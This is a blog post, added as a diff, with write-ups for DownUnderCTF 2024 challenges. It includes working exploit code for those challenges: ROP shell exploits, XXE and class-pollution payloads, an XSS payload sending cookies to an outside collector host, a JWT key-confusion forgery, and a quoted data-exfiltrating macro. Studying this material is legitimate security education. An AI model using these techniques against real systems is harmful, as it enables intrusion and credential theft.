@@ -1,0 +1,346 @@
+---
+title: DownUnderCTF 2024 Write-Up
+date: 2024-07-06T21:54:40+08:00
+image: ductf2024-ouuan-certificate.png
+lang: en
+tags:
+-   writeup
+-   ctf
+---
+
+Write-up for [DownUnderCTF 2024](https://ctftime.org/event/2284) challenges solved by me.
+
+<Excerpt />
+
+Challenges and official solutions are available at [DownUnderCTF/Challenges\_2024\_Public](https://github.com/DownUnderCTF/Challenges_2024_Public).
+
+## pwn
+
+### vector overflow (239 solves)
+
+See the source code of `vector`:
+
+```cpp
+      struct _Vector_impl_data
+      {
+	pointer _M_start;
+	pointer _M_finish;
+    pointer _M_end_of_storage;
+```
+
+So we need to write the addresses to the start and end of a string `DUCTF`. Use gdb and try a few times to get the correct addresses and offsets.
+
+```python
+from pwn import *
+
+# p = process('./vector_overflow_raw')
+p = remote('2024.ductf.dev', 30013)
+p.sendline(b'DUCTF' + b'A' * 11 + p64(0x4051e0) + p64(0x4051e5))
+p.interactive()
+```
+
+### yawa (184 solves)
+
+Notice that `0x88` bytes are read into a buffer with size `88` and then printed out. So we can cause stack overflow and leak information.
+
+1.  Leak the stack canary.
+2.  Leak the return address of `main`, and use it to compute the address of `libc`.
+3.  Use ROP to execute `system("/bin/sh")`
+
+```python
+from pwn import *
+
+yawa = ELF('./yawa')
+context.binary = yawa
+# p = process()
+p = remote('2024.ductf.dev', 30010)
+
+p.sendlineafter(b'>', b'1')
+p.send(b'A' * 83 + b'canary')
+p.sendlineafter(b'>', b'2')
+p.recvuntil(b'canary')
+canary = b'\0' + p.recv(7)
+
+p.sendlineafter(b'>', b'1')
+p.send(b'A' * 100 + b'addr')
+p.sendlineafter(b'>', b'2')
+p.recvuntil(b'addr')
+ret_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')
+
+libc = ELF('./libc.so.6')
+libc.address = ret_addr - 0x29d90
+rop = ROP(libc)
+rop.raw(b'A' * 88 + canary + b'A' * 8)
+rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
+rop.raw(next(libc.search(b'/bin/sh\0')))
+rop.raw(rop.find_gadget(['ret'])[0]) # stack alignment
+rop.raw(libc.symbols['system'])
+
+p.sendlineafter(b'>', b'1')
+p.send(rop.chain())
+p.sendlineafter(b'>', b'3')
+p.interactive()
+```
+
+## misc
+
+### DNAdecay (148 solves)
+
+Notice the `require "doublehelix"` in the first line of the code. Then we can find the encoding logic at [doublehelix/lib/doublehelix.rb · mame/doublehelix](https://github.com/mame/doublehelix/blob/master/lib/doublehelix.rb).
+
+Decoding is straightforward when at least one side is known. When both of the two sides are broken, enumerate within valid ASCII.
+
+```python
+pos = [[1,2], [0,3], [0,4], [0,5], [1,6], [2,7], [3,7], [4,7], [5,6]]
+pos = pos + list(reversed(pos))
+
+d0 = {
+    'A': 0,
+    'C': 2,
+    'G': 1,
+    'T': 3,
+}
+d1 = {
+    'T': 0,
+    'G': 2,
+    'C': 1,
+    'A': 3,
+}
+
+with open('dna.rb') as f:
+    next(f)
+    next(f)
+    val = [0]
+    i = 0
+    for line in f:
+        if line[pos[i % len(pos)][0]] in 'ACGT':
+            for j in range(len(val)):
+                val[j] += d0[line[pos[i % len(pos)][0]]] * 4 ** (i % 4)
+        elif line[pos[i % len(pos)][1]] in 'ACGT':
+            for j in range(len(val)):
+                val[j] += d1[line[pos[i % len(pos)][1]]] * 4 ** (i % 4)
+        else:
+            newval = []
+            for j in range(len(val)):
+                for k in range(4):
+                    newval.append(val[j] + k * 4 ** (i % 4))
+            val = newval
+        i += 1
+        if i % 4 == 0:
+            a = []
+            for c in val:
+                if 33 <= c <= 126:
+                    a.append(chr(c))
+            if len(a) == 1:
+                print(a[0], end='')
+            else:
+                print(f"{{{','.join(a)}}}", end='')
+            val = [0]
+```
+
+This gives multiple solutions: `puts"DUCTF{7H3_Mit0{c,g,k,o}HOn{d,e,f,g}Ri4{O,_,/,o,?}15{O,_,o}7he_P0wEr_HoU{p,q,r,s}E_of{O,_,o}DA_C3LL}"`
+
+Get the correct one based on its meaning: “the mitochondria is the power house of da cell”.
+
+### WebSocket VPN (23 solves)
+
+Just send IP datagrams of TCP handshaking and an HTTP request through the WebSocket:
+
+```python
+import websocket
+from scapy.all import *
+
+ws = websocket.WebSocket()
+ws.connect("wss://misc-wsvpn-02c06ee1b4e1.2024.ductf.dev/connect")
+print(ws.recv())
+
+SPORT = 1337
+
+ip = IP(src="1.2.3.4", dst="10.0.0.1")
+syn = TCP(sport=SPORT, dport=80, flags='S')
+syn_packet = ip/syn
+ws.send(bytes(syn_packet), websocket.ABNF.OPCODE_BINARY)
+
+synack = IP(ws.recv())
+synack.show()
+
+http_request = "GET / HTTP/1.1\r\nHost: 10.0.0.1\r\n\r\n"
+ack = TCP(sport=SPORT, dport=80, flags='PA', seq=synack[TCP].ack, ack=synack[TCP].seq+1)
+ack_packet = ip/ack/http_request
+ws.send(bytes(ack_packet), websocket.ABNF.OPCODE_BINARY)
+
+response = IP(ws.recv())
+response.show()
+response = IP(ws.recv())
+response.show()
+
+ws.close()
+```
+
+### the other minimal php (22 solves)
+
+Because of the `htmlspecialchars`, the payload needs to be valid UTF-8.
+
+Take a look at the valid UTF-8 ranges: https://en.wikipedia.org/wiki/UTF-8#Encoding
+
+The inversions of `0xxxxxxx`, `1110xxxx` and `11110xxx` are not printable ASCII, while the inversions of `110xxxxx` and `10xxxxxx` are. So a possible approach is to construct codes that follow the `110xxxxx`, `10xxxxxx`, `110xxxxx`, `10xxxxxx`, `110xxxxx`, `10xxxxxx`… pattern.
+
+Many frequently used punctuation marks are in the `0x20-0x3f` range, including space, quotes, `()$;=`, and the numbers. `0x40-0x7f` are mainly the letters. The key to the construction is to utilize the punctuation marks in `0x40-0x7f`: ``` @[\]^_`{|}~ ```.
+
+Backticks can be used to get shellcode results. In the shell, we can add many quotes. See other details in the final constructions and payloads:
+
+```php
+<?php
+$s = <<<'EOF'
+ {$a=`"p"r"i"n"t"f p"r"i"n"t"f"`;}$a(`"l"s \/`)^0x1a;{;}
+EOF;
+$s = <<<'EOF'
+ {$a=`"p"r"i"n"t"f p"r"i"n"t"f"`;}$a(` c"a"t \/f"l"a"g"`)^0x1a;{;}
+EOF;
+eval($s);
+echo urlencode(~$s);
+```
+
+### mkductfiso (19 solves)
+
+Extract the ISO to see that `initramfs-linux.img` and `{amd,intel}-ucode.img` are missing. So we can copy the `initramfs-linux.img` from the official Arch Linux ISO to `arch/boot/x86_64/`, and delete the `ucode.img` requirement in `boot/syslinux/archiso_sys-linux.cfg`.
+
+To make a bootable ISO file, we can refer to [the `mkarchiso` script](https://gitlab.archlinux.org/archlinux/archiso/-/blob/88102d8b44554e543f28dc6413b1d5497e99586d/archiso/mkarchiso#L1752):
+
+```sh
+xorriso -no_rc -as mkisofs \
+        -iso-level 3 \
+        -full-iso9660-filenames \
+        -joliet \
+        -joliet-long \
+        -rational-rock \
+        -eltorito-boot boot/syslinux/isolinux.bin \
+        -eltorito-catalog boot/syslinux/boot.cat \
+        -no-emul-boot -boot-load-size 4 -boot-info-table \
+        -output ductfiso.iso \
+        ductfiso
+```
+
+Boot the ISO file in VirtualBox to get the flag.
+
+## web
+
+### zoo feedback form (693 solves)
+
+XXE:
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY flag SYSTEM "/flag.txt"> ]>
+<root>
+    <feedback>&flag;</feedback>
+</root>
+```
+
+### co2 (289 solves)
+
+Python class pollution: Send feedback `{"__class__":{"__init__":{"__globals__":{"flag":"true"}}}}`.
+
+### co2v2 (59 solves)
+
+Use class pollution to cancel the XSS countermeasures. POST the payload to `/save_feedback` and `/admin/update-accepted-templates`: `{"policy":"strict","__class__":{"__init__":{"__globals__":{"TEMPLATES_ESCAPE_ALL":false,"SECRET_NONCE":"","RANDOM_COUNT":0}}}}`. Then the templates are not escaped and the nonce is fixed and known.
+
+The `/blog/<id>` routes are actually not displaying the blogs, so we need to use the blogs displayed on the homepage. The blog contents are cut at the first 100 characters, but the titles are not. So we can create a blog with title `<script nonce=8a5edab282632443219e051e4ade2d1d5bbc671c781051bf1437897cbdfea0f1>fetch('https://apnrf369.requestrepo.com/',{method:'POST',body:document.cookie})</script>`.
+
+### hah got em (173 solves)
+
+Find the security notice in the release note of the next version: [Release 8.1.0 · gotenberg/gotenberg](https://github.com/gotenberg/gotenberg/releases/tag/v8.1.0).
+
+Then check the commit log to find the patch: [fix(chromium): better default deny list regexp · gotenberg/gotenberg@ad152e6](https://github.com/gotenberg/gotenberg/commit/ad152e62e5124b673099a9103eb6e7f933771794).
+
+The URL is first resolved and then checked against the regular expression, so we cannot use `/tmp/../` to bypass it. However, we can use any one of `t`, `m`, `p` as the first letter, so we can use `file:///proc/self/root/etc/flag.txt`.
+
+### i am confusion (113 solves)
+
+Notice that the signing algorithm is `RS256` but both `RS256` and `HS256` are accepted in verification. `RS256` is asymmetric but `HS256` is symmetric. Verification uses the public key for asymmetric algorithms. The same key is used for both signing and verification for symmetric algorithms. So we can forge `HS256` signatures with the public key of `RS256`.
+
+The same private key is used for both JWT and TLS, so they also use the same public key. Then we can download the TLS certificate in the browser and get the public key.
+
+```javascript
+const fs = require('fs');
+const crypto = require('crypto');
+const jwt = require('jsonwebtoken');
+
+const pem = fs.readFileSync('i-am-confusion.2024.ductf.pem');
+const publicKey = crypto.createPublicKey({
+  key: pem,
+  format: 'pem',
+}).export({
+  format: 'pem',
+  type: 'pkcs1',
+});
+
+const token = jwt.sign({ user: 'admin' }, publicKey, { algorithm: 'HS256' });
+console.log(token);
+```
+
+## forensics
+
+### Macro Magic (146 solves)
+
+View the macro codes in Office. There are many useless codes and comments with fake flags. The relevant codes are in `macro1`. The flag is at `Q = "Flag: " & valueA1`. Trace the data flow to see the codes that really matter:
+
+```vb
+S = "Mon"
+D = "Ma"
+G = "key"
+F = "gic"
+Q = "Flag: " & valueA1
+O = doThing(Q, W)
+Z = forensics(O)
+T = totalyFine(Z)
+J = "http://downunderctf.com/" + T
+superThing (J)
+
+Public Function doThing(B As String, C As String) As String
+    Dim I As Long
+    Dim A As String
+    For I = 1 To Len(B)
+        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
+    Next I
+    doThing = A
+End Function
+
+Public Function forensics(B As String) As String
+    Dim A() As Byte
+    Dim I As Integer
+    Dim C As String
+    A = StrConv(B, vbFromUnicode)
+    For I = LBound(A) To UBound(A)
+        C = C & CStr(A(I)) & " "
+    Next I
+    C = Trim(C)
+    forensics = C
+End Function
+
+Public Function totalyFine(A As String) As String
+    Dim B As String
+    B = Replace(A, " ", "-")
+    totalyFine = B
+End Function
+
+Public Function superThing(ByVal A As String) As String
+    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        .Open "GET", A, False
+        .Send
+        superThing = StrConv(.responseBody, vbUnicode)
+    End With
+End Function
+```
+
+The only useful HTTP request in the pcapng file is `GET /11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19 HTTP/1.1` with `Host: downunderctf.com`. It's the ASCII of the flag XORed with `MonkeyMagic` cyclically.
+
+## osint
+
+### Bridget Lives (505 solves)
+
+Search the image on Google to find that it is the Jiak Kim Bridge. Then use Google Earth to find that the building nearby is FOUR POINTS.
+
+### back to the jungle (460 solves)
+
+Search for “MC Fat Monke” to find the video [MC Fat Monke - Back to the Jungle - YouTube](https://www.youtube.com/watch?v=jmhn3IMLQyM). There is a “FREE FLAG” page at 2:34. Visit the URL of that page to get the flag.
